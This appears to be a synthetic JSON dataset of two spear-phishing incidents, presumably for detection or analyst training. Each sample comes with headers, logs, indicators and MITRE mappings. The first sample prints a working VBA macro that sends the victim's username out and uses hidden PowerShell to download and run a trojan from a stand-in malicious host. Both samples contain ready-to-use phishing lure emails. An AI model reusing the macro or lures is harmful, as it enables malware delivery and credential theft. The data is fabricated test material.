@@ -1,0 +1,112 @@
+{
+  "samples": [
+    {
+      "scenario": "Spear-phishing email targeting a human resources director with a personalized message and a malicious Word document attachment exploiting a macro to deploy a remote access trojan.",
+      "technical_data": {
+        "email_headers": "Return-Path: <recruitment@trustedrecruiter.com>\r\nReceived: from mail.trustedrecruiter.com (mail.trustedrecruiter.com [203.0.113.77])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 9876ZYXW\r\n\tfor <hr.director@enterprise.com>; Wed, 21 Jun 2023 09:15:45 +0000 (UTC)\r\nX-Originating-IP: [203.0.113.77]\r\nX-Mailer: Microsoft Outlook 365\r\nX-Spam-Flag: NO\r\nX-Spam-Status: No, score=0.1\r\nSubject: New Candidate Profile for Your Review - Confidential\r\nFrom: \"Emma Williams\" <recruitment@trustedrecruiter.com>\r\nTo: hr.director@enterprise.com\r\nMessage-ID: <CA+G9H4d5nU0Lp2oKo9@mail.trustedrecruiter.com>\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_54321_987654321.1624277330\"",
+        "email_body_plain": "Dear Sarah,\n\nPlease find attached the detailed candidate profile for the Software Engineer position you recently posted. Kindly review the attached document and let me know your feedback.\n\nBest regards,\nEmma Williams\nSenior Recruiter\nTrusted Recruiter Inc.\n\nPhone: +1-555-987-6543\nEmail: recruitment@trustedrecruiter.com\n\n---\nConfidentiality Notice: This email and attachments contain confidential information intended only for the recipient.",
+        "attachment_info": {
+          "filename": "Candidate_Profile_June_2023.docm",
+          "md5": "1a79a4d60de6718e8e5b326e338ae533",
+          "sha256": "b3e2c4a2d9e8f7b633a2d9e8c4b3f9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7",
+          "macro_code_snippet": "Sub Document_Open()\r\n  Dim httpReq As Object\r\n  Set httpReq = CreateObject(\"MSXML2.XMLHTTP\")\r\n  Dim targetURL As String\r\n  targetURL = \"https://update.trustedrecruiter.com/collect?user=\" & Environ(\"USERNAME\")\r\n  httpReq.Open \"POST\", targetURL, False\r\n  httpReq.Send\r\n  Shell \"powershell -windowstyle hidden -command Invoke-WebRequest -Uri http://malicious-downloads.example.net/rat.exe -OutFile $env:TEMP\\rat.exe; Start-Process $env:TEMP\\rat.exe\", vbHide\r\nEnd Sub",
+          "macro_behavior": "Upon opening the Word document, the macro silently sends a POST request to a command and control server with the victim's username and downloads a remote access trojan executable to the victim's TEMP directory, then executes it to establish persistence and remote control.",
+          "attachment_filetype": "Microsoft Word Macro-Enabled Document"
+        },
+        "smtp_transaction_logs": "220 mail.trustedrecruiter.com ESMTP Postfix\r\nEHLO mail.trustedrecruiter.com\r\n250-mail.trustedrecruiter.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<recruitment@trustedrecruiter.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr.director@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>",
+        "url_obfuscation": "https://update.trustedrecruiter[.]com/collect?user=SarahH",
+        "domain_registration": {
+          "domain": "malicious-downloads.example.net",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-04-10T08:33:00Z",
+          "registrant": {
+            "name": "Redacted for Privacy",
+            "organization": "PrivacyGuard Services",
+            "email": "contact@privacyguard.com"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "203.0.113.77",
+              "ttl": 3600
+            }
+          ]
+        },
+        "network_capture_excerpt": "Frame 210: 210 bytes on wire (1680 bits), 210 bytes captured (1680 bits) on interface eth1, id 0\nEthernet II, Src: 00:15:5d:01:23:45, Dst: 00:0c:29:5e:6f:12\nInternet Protocol Version 4, Src: 192.168.10.15, Dst: 203.0.113.77\nTransmission Control Protocol, Src Port: 52431, Dst Port: 443, Seq: 1, Ack: 1, Len: 134\nHypertext Transfer Protocol\n    POST /collect?user=SarahH HTTP/1.1\r\n    Host: update.trustedrecruiter.com\r\n    User-Agent: Microsoft Word Macro\r\n    Content-Length: 0\r\n    Connection: close\r\n",
+        "mail_server_log_entry": "Jun 21 09:15:47 mail postfix/smtp[56789]: 5F6E7D8C9B: to=<hr.director@enterprise.com>, relay=mail.trustedrecruiter.com[203.0.113.77]:25, delay=1.8, delays=0.05/0.02/1.2/0.53, dsn=2.0.0, status=sent (250 2.0.0 Ok: queued as 9876ZYXW)",
+        "employee_communication_note": "Human resources director received an unsolicited candidate profile with accurate job references and terminology. The email sender appeared legitimate but was not on the approved vendor list. The attachment triggered suspicion after IT awareness training about macro-enabled documents.",
+        "indicators": {
+          "malicious_domain": "malicious-downloads.example.net",
+          "malicious_ip": "203.0.113.77",
+          "attachment_hashes": {
+            "md5": "1a79a4d60de6718e8e5b326e338ae533",
+            "sha256": "b3e2c4a2d9e8f7b633a2d9e8c4b3f9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7"
+          },
+          "suspicious_macro_keywords": [
+            "Document_Open",
+            "MSXML2.XMLHTTP",
+            "Invoke-WebRequest",
+            "malicious-downloads.example.net/rat.exe"
+          ],
+          "email_spoofing": "From: recruitment@trustedrecruiter.com (spoofed, IP 203.0.113.77 not authorized in SPF record)",
+          "smtp_originating_ip": "203.0.113.77",
+          "unusual_http_requests": "POST /collect?user=SarahH"
+        },
+        "detection_method": "Email security gateway flagged the attachment due to macro content and sandbox analysis revealed network connection to external IPs. Network IDS detected suspicious POST request to unrecognized domain. User reported unexpected attachment leading to incident response.",
+        "relevant_mitre_techniques": [
+          "T1566.001 - Phishing: Spearphishing Attachment",
+          "T1204.002 - User Execution: Malicious File",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1059.001 - Command and Scripting Interpreter: PowerShell",
+          "T1566 - Phishing"
+        ]
+      }
+    },
+    {
+      "scenario": "Spear-phishing email aimed at a legal department manager with a personalized message and an embedded hyperlink to a credential harvesting website disguised as a secure document portal.",
+      "technical_data": {
+        "email_headers": "Return-Path: <legal.notifications@secure-docs.com>\r\nReceived: from mail.secure-docs.com (mail.secure-docs.com [198.51.100.88])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 3344FFEE\r\n\tfor <legal.manager@enterprise.com>; Thu, 22 Jun 2023 16:40:55 +0000 (UTC)\r\nX-Originating-IP: [198.51.100.88]\r\nX-Mailer: Apple Mail (2.3445.5.20)\r\nX-Spam-Flag: NO\r\nX-Spam-Status: No, score=0.2\r\nSubject: Urgent: Pending Legal Document for Your Review\r\nFrom: \"Legal Notifications\" <legal.notifications@secure-docs.com>\r\nTo: legal.manager@enterprise.com\r\nMessage-ID: <CA+J6K8r3Wx9Zf5QgL@mail.secure-docs.com>\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"",
+        "email_body_plain": "Dear Michael,\n\nYou have a pending legal document requiring your immediate attention. Please access the document securely via the link below:\n\nhttps://secure-docs.example.org/login?session=abc123def456\n\nFailure to review the document within 24 hours may result in compliance issues.\n\nBest regards,\nLegal Compliance Team\nSecure Docs Service\n\nPhone: +1-555-321-7654\nEmail: legal.notifications@secure-docs.com",
+        "attachment_info": null,
+        "smtp_transaction_logs": "220 mail.secure-docs.com ESMTP Postfix\r\nEHLO mail.secure-docs.com\r\n250-mail.secure-docs.com\r\n250-PIPELINING\r\n250-SIZE 5120000\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<legal.notifications@secure-docs.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<legal.manager@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>",
+        "url_obfuscation": "https://secure-docs[.]example[.]org/login?session=abc123def456",
+        "domain_registration": {
+          "domain": "secure-docs.example.org",
+          "registrar": "Google LLC",
+          "creation_date": "2023-06-01T13:45:00Z",
+          "registrant": {
+            "name": "Redacted for Privacy",
+            "organization": "PrivacyProtect",
+            "email": "privacy@privacyprotect.org"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "198.51.100.88",
+              "ttl": 3600
+            }
+          ]
+        },
+        "network_capture_excerpt": "Frame 178: 178 bytes on wire (1424 bits), 178 bytes captured (1424 bits) on interface eth0, id 0\nEthernet II, Src: 00:1a:4b:7f:2c:1d, Dst: 00:0c:29:68:7a:bc\nInternet Protocol Version 4, Src: 192.168.20.22, Dst: 198.51.100.88\nTransmission Control Protocol, Src Port: 55123, Dst Port: 443, Seq: 1, Ack: 1, Len: 112\nHypertext Transfer Protocol\n    GET /login?session=abc123def456 HTTP/1.1\r\n    Host: secure-docs.example.org\r\n    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\r\n    Accept: text/html,application/xhtml+xml\r\n    Connection: keep-alive\r\n",
+        "mail_server_log_entry": "Jun 22 16:40:57 mail postfix/smtp[34567]: 9G8H7J6K5L: to=<legal.manager@enterprise.com>, relay=mail.secure-docs.com[198.51.100.88]:25, delay=1.2, delays=0.04/0.01/0.8/0.35, dsn=2.0.0, status=sent (250 2.0.0 Ok: queued as 3344FFEE)",
+        "employee_communication_note": "Legal manager received an unexpected email referencing a pending document with a personalized greeting and urgent tone. The embedded link pointed to a domain mimicking a known document management service but was unrecognized by IT. User reported suspicious nature after completing login unsuccessfully.",
+        "indicators": {
+          "malicious_domain": "secure-docs.example.org",
+          "malicious_ip": "198.51.100.88",
+          "attachment_hashes": null,
+          "suspicious_macro_keywords": null,
+          "email_spoofing": "From: legal.notifications@secure-docs.com (spoofed, IP 198.51.100.88 not authorized in SPF record)",
+          "smtp_originating_ip": "198.51.100.88",
+          "unusual_http_requests": "GET /login?session=abc123def456"
+        },
+        "detection_method": "Email security filters flagged the domain due to mismatch in SPF and DMARC policies. Network IDS detected outbound HTTPS requests to an unrecognized domain shortly after email receipt. User education prompted verification of unexpected links via separate channels. Incident response blocked domain and IP.",
+        "relevant_mitre_techniques": [
+          "T1566.002 - Phishing: Spearphishing Link",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1531 - Account Access Removal (post-compromise activity sometimes following credential theft)",
+          "T1566 - Phishing"
+        ]
+      }
+    }
+  ]
+}
